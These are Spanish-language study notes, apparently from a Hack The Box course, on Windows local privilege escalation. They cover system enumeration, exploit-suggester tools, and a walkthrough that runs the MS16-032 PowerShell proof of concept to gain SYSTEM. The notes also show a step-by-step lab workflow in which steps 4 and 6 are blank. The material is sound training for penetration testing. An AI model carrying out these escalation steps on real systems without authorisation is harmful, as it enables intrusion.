
## 1. Enumeración del sistema

Antes de probar exploits locales, debemos identificar la versión de Windows, la arquitectura y los parches instalados. Un exploit que funciona en una versión puede fallar en otra.

### Obtener información del sistema

```
systeminfo
```

Muestra información como:

- Versión y compilación de Windows.
    
- Service Pack instalado.
    
- Arquitectura del sistema (`x64-based PC` o `x86-based PC`).
    
- Información del hardware y del sistema.
    

Consultar los parches instalados:

```
wmic qfe
```

La salida permite revisar las actualizaciones instaladas y comprobar si faltan parches relacionados con vulnerabilidades conocidas.

**Importante:** conocer la arquitectura y los parches es fundamental antes de ejecutar un exploit.

---

## 2. Identificar posibles vulnerabilidades

### Windows-Exploit-Suggester

Herramienta que compara la información obtenida mediante `systeminfo` con una base de datos de vulnerabilidades de Microsoft para identificar posibles vectores de escalada de privilegios.

#### Paso 1: guardar la información del sistema

En la máquina Windows:

```
systeminfo
```

Guarda la salida en un archivo de texto en tu máquina atacante, por ejemplo:

```
win7lpe-systeminfo.txt
```

#### Paso 2: actualizar la base de datos

En la máquina atacante, desde el directorio de la herramienta:

```
sudo python2 windows-exploit-suggester.py --update
```

Esto descarga una copia local de la base de datos de vulnerabilidades.

#### Paso 3: comparar el sistema con la base de datos

```
python2 windows-exploit-suggester.py \
  --database 2021-05-13-mssb.xls \
  --systeminfo win7lpe-systeminfo.txt
```

Adapta el nombre del archivo de base de datos al que haya generado la herramienta.

La salida puede mostrar:

- Boletines de seguridad relacionados con vulnerabilidades.
    
- Exploits disponibles en Exploit-DB.
    
- Módulos de Metasploit.
    
- Posibles vulnerabilidades que conviene investigar.
    

### Interpretar los resultados

La herramienta genera candidatos, no confirma que todos los exploits funcionen.

Debemos descartar:

- Vulnerabilidades que no afectan a nuestra versión de Windows.
    
- Exploits incompatibles con la arquitectura.
    
- Vulnerabilidades cuyos parches ya estén instalados.
    
- Exploits de denegación de servicio (DoS) cuando el objetivo sea escalar privilegios.
    
- PoC que no cumplan los requisitos del sistema.
    

En el ejemplo de HTB, uno de los candidatos interesantes es **MS16-032**, relacionado con el servicio Secondary Logon.

## 3. Enumeración mediante Metasploit

Si ya tenemos una sesión de Meterpreter, podemos utilizar un módulo de Metasploit para buscar posibles exploits locales.

```
use post/multi/recon/local_exploit_suggester
set SESSION <ID_SESION>
run
```

El módulo analiza la sesión y propone posibles módulos de escalada compatibles con el sistema.

> La disponibilidad y los resultados dependen de la versión de Metasploit, el tipo de sesión y la información que pueda obtener del objetivo.

Debemos revisar cada resultado antes de intentar explotarlo.

## 4. Explotar MS16-032 mediante PowerShell

HTB utiliza una PoC de PowerShell para intentar explotar una vulnerabilidad relacionada con el servicio **Secondary Logon**.

### Paso 1: permitir la ejecución de scripts en el proceso actual

En PowerShell:

```
Set-ExecutionPolicy Bypass -Scope Process
```

Este cambio afecta al proceso actual de PowerShell y no modifica permanentemente la política de ejecución del sistema.

### Paso 2: importar la PoC

Suponiendo que el archivo `Invoke-MS16-032.ps1` se encuentra en el directorio actual:

```
Import-Module .\Invoke-MS16-032.ps1
```

### Paso 3: ejecutar la PoC

```
Invoke-MS16-032
```

Si el exploit funciona y consigue crear una consola con privilegios elevados, comprueba la identidad:

```
whoami
```

Resultado esperado en el ejemplo de HTB:

```
nt authority\system
```

**Nota:** estos comandos reproducen el procedimiento de la sección. El éxito depende de que el sistema objetivo sea vulnerable y de que se cumplan los requisitos del exploit.

## 5. Verificar la escalada de privilegios

Una vez ejecutado el exploit, comprueba qué usuario está ejecutando la consola:

```
whoami
```

Para consultar los grupos y privilegios del contexto actual:

```
whoami /all
```

Distingue entre:

- **Usuario actual:** la cuenta con la que se está ejecutando el proceso.
    
- **Administrador:** una cuenta o grupo con privilegios administrativos.
    
- `**NT AUTHORITY\SYSTEM**`**:** una identidad de Windows con privilegios locales muy elevados.
    

Si el objetivo del laboratorio es alcanzar `SYSTEM`, obtener una consola que siga ejecutándose como el usuario inicial no significa que la escalada haya funcionado.

## 6. Por qué pueden fallar los exploits manuales

Que una PoC aparezca en los resultados de una herramienta no garantiza que funcione en el objetivo.

Antes de ejecutar un exploit, comprueba:

|Factor|Qué comprobar|
|---|---|
|Versión de Windows|Que la vulnerabilidad afecte a esa versión y compilación.|
|Arquitectura|Compatibilidad con x86 o x64.|
|Parches|Que el sistema no tenga instalada la actualización que corrige la vulnerabilidad.|
|Requisitos|Que se cumplan los privilegios y condiciones necesarias.|
|Tipo de exploit|Que permita escalada de privilegios y no sea únicamente un DoS.|
|Resultado|Que el proceso termine correctamente y que los privilegios hayan cambiado.|

Si el ejecutable se cierra o la consola desaparece, puede haber ocurrido un fallo del proceso. Si termina sin elevar privilegios, puede que el exploit no sea aplicable o que no haya conseguido activar la vulnerabilidad.

No ejecutes repetidamente una PoC sin comprobar antes su compatibilidad y sus requisitos.

## 7. Diferencias de seguridad entre Windows 7 y Windows 10

HTB destaca varias mejoras de seguridad incorporadas o ampliadas en versiones posteriores de Windows.

|Característica|Windows 7|Windows 10|
|---|---|---|
|Microsoft Password / MFA|No disponible según la tabla|Disponible|
|BitLocker|Parcial|Disponible|
|Credential Guard|No disponible según la tabla|Disponible|
|Remote Credential Guard|No disponible según la tabla|Disponible|
|Device Guard|No disponible según la tabla|Disponible|
|AppLocker|Parcial|Disponible|
|Windows Defender|Parcial|Disponible|
|Control Flow Guard|No disponible según la tabla|Disponible|

Windows 7 llegó al final de su ciclo de vida el **14 de enero de 2020**. Su uso en entornos antiguos puede mantener riesgos de seguridad, especialmente si no recibe las actualizaciones necesarias.

Sin embargo, al evaluar un sistema heredado, no basta con recomendar su sustitución: también hay que entender las limitaciones operativas del cliente y proponer medidas para reducir la exposición mientras se planifica la migración.

## 8. Flujo de trabajo para el laboratorio

```
1. Obtener una shell en el objetivo
              |
              v
2. Enumerar el sistema
   - systeminfo
   - wmic qfe
              |
              v
3. Comprobar versión, arquitectura y parches
              |
              v

   - Windows-Exploit-Suggester
   - Local Exploit Suggester de Metasploit
              |
              v
5. Filtrar los resultados
   - Compatibilidad con Windows
   - Arquitectura
   - Parches
   - Requisitos
   - Impacto del exploit
              |
              v

              |
              v
7. Verificar el contexto con whoami
              |
              v
8. Confirmar si se ha obtenido SYSTEM
```

## Ideas clave para el examen

- **Enumera antes de explotar:** identifica la versión de Windows, la arquitectura y los parches.
    
- **Los resultados de un suggester son candidatos**, no garantías de vulnerabilidad.
    
- **Comprueba la arquitectura:** una PoC x86 no es automáticamente compatible con x64.
    
- **Filtra los DoS:** no sirven para una escalada de privilegios si solo provocan una interrupción del servicio.
    
- **Verifica siempre el resultado:** utiliza `whoami` para comprobar la identidad obtenida.
    
- **Distingue administrador de SYSTEM:** el objetivo puede exigir específicamente `NT AUTHORITY\SYSTEM`.
    
- **No confundas una PoC disponible con una PoC aplicable:** la versión, los parches y los requisitos determinan si puede funcionar.
